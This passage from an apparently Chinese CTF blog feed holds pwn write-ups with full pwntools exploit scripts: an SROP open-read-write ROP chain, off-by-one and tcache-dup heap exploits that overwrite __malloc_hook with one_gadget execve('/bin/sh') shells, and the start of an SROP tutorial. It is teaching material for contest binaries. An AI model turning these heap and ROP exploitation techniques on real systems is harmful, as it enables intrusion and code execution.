class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        